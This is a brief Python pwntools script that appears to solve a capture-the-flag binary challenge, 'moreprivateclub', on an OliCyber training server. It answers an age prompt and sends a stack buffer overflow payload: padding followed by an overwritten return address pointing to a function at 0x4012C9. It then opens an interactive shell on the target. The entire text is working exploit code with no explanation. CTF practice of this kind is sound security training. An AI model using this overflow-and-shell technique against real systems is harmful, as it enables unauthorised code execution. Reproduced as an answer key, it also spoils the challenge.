from pwn import *

exe = context.binary = ELF("moreprivateclub", False)

HOST = "moreprivateclub.challs.olicyber.it"
PORT = 10016

if args.REMOTE:
    r = remote(HOST, PORT)
else:
    r = process()


sys_addr = 0x00000000004012C9

payload = b"A"*35
payload += b"A"*12
payload += b"A"*8
payload += p64(sys_addr)

r.recvuntil(b"?")
r.sendline(b"18")

r.recvuntil(b"?")
r.sendline(payload)

r.interactive() # we love shells
